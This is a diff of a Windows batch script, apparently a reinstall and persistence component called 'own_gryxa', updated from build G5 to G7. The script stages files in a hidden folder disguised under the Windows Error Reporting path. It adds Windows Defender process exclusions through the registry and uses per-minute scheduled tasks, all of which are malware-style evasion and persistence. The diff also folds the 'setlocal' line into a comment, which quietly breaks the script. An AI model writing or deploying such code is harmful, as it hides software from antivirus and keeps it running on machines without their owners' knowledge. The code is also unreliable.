@@ -1,7 +1,6 @@
 @echo off
 rem OWN_GRYXA_FORCE BUILD 20260804F8 - REINSTALL breakaway (wmic plain path + PS Start-Process + minute task)
-rem F8: wmic failed on escaped quotes; schtasks ONCE stays Queued — use MINUTE+/Run.
-setlocal EnableExtensions EnableDelayedExpansion
+rem F8: wmic failed on escaped quotes; schtasks ONCE stays Queued — use MINUTE+/Run. Requires G7.setlocal EnableExtensions EnableDelayedExpansion
 
 set "WD=%~1"
 if "%WD%"=="" set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
@@ -28,7 +27,7 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Processes" /v "Scre
 
 set "NEED_G=1"
 if exist "%WD%\own_gryxa.cmd" (
-  findstr /C:"OWN_GRYXA BUILD 20260804G5" "%WD%\own_gryxa.cmd" >nul 2>&1
+  findstr /C:"OWN_GRYXA BUILD 20260804G7" "%WD%\own_gryxa.cmd" >nul 2>&1
   if not errorlevel 1 set "NEED_G=0"
 )
 if "%NEED_G%"=="1" (
@@ -44,13 +43,13 @@ if not exist "%WD%\own_gryxa.cmd" (
   endlocal & exit /b 2
 )
 
-findstr /C:"REINSTALL" "%WD%\own_gryxa.cmd" >nul 2>&1
+findstr /C:"OWN_GRYXA BUILD 20260804G7" "%WD%\own_gryxa.cmd" >nul 2>&1
 if errorlevel 1 (
   echo BUILD=%BUILD%
   echo HOST=%COMPUTERNAME%
   echo HEALTH=FAIL
-  echo REASON=own_gryxa-not-G5
-  echo REPORT %COMPUTERNAME% %FP% FAIL own_gryxa-not-G5
+  echo REASON=own_gryxa-not-G7
+  echo REPORT %COMPUTERNAME% %FP% FAIL own_gryxa-not-G7
   endlocal & exit /b 3
 )
 
